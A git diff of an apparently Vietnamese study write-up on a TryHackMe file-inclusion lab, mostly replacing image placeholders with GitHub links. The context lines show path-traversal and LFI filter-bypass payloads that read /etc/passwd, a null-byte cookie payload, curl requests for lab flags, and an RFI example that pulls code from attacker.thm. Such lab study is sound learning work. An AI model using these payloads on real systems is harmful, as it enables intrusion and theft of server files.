@@ -2,23 +2,23 @@
 
 ***What is File inclusion?***
 
-![img](65)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image65.png?raw=true)
 
-![img](66)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image66.png?raw=true)
 
 ***Truy cập File Inclusion Lab: ***
 
-![img](67)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image67.png?raw=true)
 
 ***Path Traversal***
 
-![img](68)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image68.png?raw=true)
 
 Có thể kiểm tra tham số URL bằng cách thêm payload để xem web application hoạt động như nào. Các tấn công ***Path traversal***, hay còn gọi là tấn công ***dot-dot-slash***, lợi dụng việc di chuyển directory lên 1 bậc bằng cách sử dụng double dots ***"../"*** . Nếu attacker tìm thấy entry point, trong TH này là ***get.php?file=***, thì attacker có thể thêm payload vào đó như sau: http://webapp.thm/get.php?file=../../../../etc/passwd
 
 Giả sử không có xác thực input, thay vì truy cập PDF file tại vị trí ***/var/www/app/CVs***, web application sẽ truy xuất files từ các directory khác, trong TH này là ***/etc/passwd***. Mỗi mục .. trong URL sẽ di chuyển một directory cho đến khi đến root directory “/”. Sau đó, nó thay đổi directory thành /etc, từ đó, nó đọc tệp passwd.
 
-![img](69)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image69.png?raw=true)
 
 => Kết quả là, web application sẽ gửi lại nội dung file ***/etc/passwd*** đến user: 
 
@@ -75,7 +75,7 @@ sẽ nhận được thông báo lỗi như sau:
 
 ***Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15.***
 
-![img](70)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image70.png?raw=true)
 
 Qua thông báo lỗi, có thể thấy rằng web application đã thay thế chuỗi ***../../../../*** bằng một chuỗi trống, dẫn đến việc đường dẫn trở thành ***languages/etc/passwd***. Tuy nhiên, có một số kỹ thuật để bypass cơ chế lọc này!
 
@@ -88,21 +88,21 @@ Kỹ thuật này hoạt động bằng cách thay thế mỗi ../ thành ....//
 Vì bộ lọc PHP chỉ khớp và thay thế chuỗi tập hợp con đầu tiên ***../*** nó tìm thấy và không thực hiện 1 đợt kiểm tra khác, để lại 1 payload như sau: 
 ***../../../../etc/passwd***
 
-![img](71)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image71.png?raw=true)
 
 Cuối cùng, trong TH developer buộc include function đọc từ 1 directory đã được xác định! Ví dụ nếu web application yêu cầu cung cấp input phải bao gồm 1 directory như: http://webapp.thm/index.php?lang=lacular/EN.php , để khai thác điều này, cần bao gồm directory trong payload, ví dụ ***?lang=lacular/../../../../etc/passwd***
 
-![img](72)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image72.png?raw=true)
 
 ***Remote File Inclusion - RFI***
 
-![img](73)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image73.png?raw=true)
 
 ***RFI Steps***
 
 Mã dưới đây là ví dụ các bước để tấn công RFI thành công! Giả sử attacker lưu trữ file PHP trên server của chúng: http://Attacker.thm/cmd.txt trong đó ***cmd.txt*** chứa thông báo ***Hello THM***:
 
-![img](74)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image74.png?raw=true)
 
 Đầu tiên, attacker chèn URL độc hại, trỏ đến server của attacker, ví dụ http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. Nếu không có xác thực input, URL độc hại sẽ được tiêm vào include function. Tiếp theo, web server sẽ gửi ***GET*** request đến server của attacker để tìm nạp file ***cmd.txt***. Do đó, web application đưa file từ xa vào include function, thực thi tệp PHP và gửi nội dung thực thi cho attacker.
 
@@ -128,13 +128,13 @@ Các bước testing LFI - Local File Inclusion:
 
 ***Challenge 1***
 
-![img](75)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image75.png?raw=true)
 
 Sử dụng ***curl*** để gửi POST request:
 
 ***curl -X POST http://10.10.212.124/challenges/chall1.php -d 'method=GET&file=/etc/flag1'***
 
-![img](76)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image76.png?raw=true)
 
 Tại sao lại truyền data ***'method=GET&file=/etc/flag1'*** vào POST body?
 
@@ -142,35 +142,35 @@ Tại sao lại truyền data ***'method=GET&file=/etc/flag1'*** vào POST body?
 
 ***file=/etc/flag1***: Tham số này có thể được sử dụng để chỉ định một tệp cụ thể mà web server cần xử lý (ở đây là /etc/flag1).
 
-![img](77)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image77.png?raw=true)
 
 Đồng thời, trong source page cho thấy server xử lý việc gửi input form bằng việc sử dụng ***method=GET***.
 
 => Tìm được flag sau khi chạy lệnh: 
 
-![img](78)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image78.png?raw=true)
 
 ***Challenge 2***
 
-![img](79)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image79.png?raw=true)
 
 Sử dụng Burp Suite: 
 
-![img](80)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image80.png?raw=true)
 
 => Tìm được header ***Cookie*** có value là ***THM=Guest***. Thay đổi thành ***admin***: 
 
-![img](81)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image81.png?raw=true)
 
 => Có thể truy cập vào trang admin
 
 => Tiếp tục thư thay đổi cookie thành ***../../../../etc/flag2%00***:
 
-![img](82)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image82.png?raw=true)
 
 ***Challenge 3***
 
-![img](83)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image83.png?raw=true)
 
 Thử sử dụng ***curl*** gửi POST request: 
 
@@ -178,11 +178,13 @@ Thử sử dụng ***curl*** gửi POST request:
 
 Thay đổi method thành POST vì chall3 này bắt nhập thẳng vào File Name field.
 
-![img](84)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image84.png?raw=true)
 
 => Kết quả: 
 
-![img](85)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Introduction_to_Web_Hacking/images/image85.png?raw=true)
+
+
 
 
 
